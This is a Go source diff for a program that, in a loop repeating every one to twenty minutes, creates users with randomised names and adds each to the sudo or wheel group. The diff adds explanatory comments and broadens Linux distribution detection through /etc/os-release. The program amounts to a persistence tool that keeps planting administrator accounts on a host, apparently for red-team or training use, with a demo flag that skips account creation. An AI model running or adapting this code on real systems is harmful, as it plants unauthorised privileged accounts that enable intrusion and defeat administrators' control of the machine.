@@ -21,7 +21,9 @@ var isVerbose bool = false
 func main() {
 	args := os.Args
 	currentOS = getOS()
+	//Build global variables
 	buildUsers()
+	//Check args
 	if len(args) > 1 {
 		for i := 1; i < len(args); i++ {
 			switch args[i] {
@@ -46,26 +48,33 @@ func main() {
 }
 
 func do() {
+	//Check to see if /sbin or /usr/sbin is in path;
 	osPath := os.Getenv("PATH")
 	if strings.Index(osPath, "/sbin") == -1 {
+		//If it isn't, add it so we can use usermod
 		os.Setenv("PATH", osPath+":/sbin:/usr/sbin")
 	}
 	if isVerbose {
 		fmt.Printf("Creating user\n")
 	}
+	//Create n number of users
 	for i := 0; i < numUsers; i++ {
+		//Pick a random name from the list
 		index := random(len(users) - 1)
 		username := users[index]
+		//Append a random number to the username
 		username = username + strconv.Itoa(random(99)) + strconv.Itoa(random(99))
 		if isVerbose {
 			fmt.Println(username)
 		}
 		if !isDemo {
+			//Create the user and add them to sudoers
 			createUser(username)
 			addSudo(username)
 			fmt.Println("Created user " + username)
 		}
 	}
+	//Delay a random amount of time, then start again
 	rand.Seed(time.Now().UnixNano())
 	delay := (random(19) + 1) * 60
 	if isVerbose {
@@ -75,23 +84,38 @@ func do() {
 	do()
 }
 
-func getOS() string {
+func getOS(isFail ...bool) string {
 	var ret_os string
+	checkID := false
+	if len(isFail) > 0 && isFail[0] {
+		checkID = true
+	}
+	//Read /etc/os-release to find what distro the host is running on
 	os_str := readFile("/etc/os-release")
 	os_split := strings.Split(os_str, "\n")
 	for i := 0; i < len(os_split); i++ {
-		if strings.Index(os_split[i], "ID=") != -1 {
-			ret_os = strings.Replace(os_split[i], "ID=", "", 1)
+		//Child distros will have ID_LIKE instead of ID. Check for both
+		matchString := "ID_LIKE="
+		if checkID {
+			matchString = "ID="
+		}
+		if strings.Index(os_split[i], matchString) == 0 {
+			ret_os = strings.Replace(os_split[i], matchString, "", 1)
 			ret_os = strings.Replace(ret_os, `"`, "", -1)
 			break
 		}
+	}
+	if ret_os == "" && !checkID {
+		// If ID_LIKE wasn't found, then seach for ID= instead
+		return getOS(true)
 	}
 	return ret_os
 }
 
 func addSudo(username string) {
+	//Check to see if we need to add the user to the sudo group or the wheel group
 	group := "sudo"
-	if currentOS == "centos" {
+	if currentOS == "centos" || strings.Index(currentOS, "rhel") != -1 || strings.Index(currentOS, "fedora") != -1 {
 		group = "wheel"
 	}
 	cmd := exec.Command("usermod", "-aG", group, username)
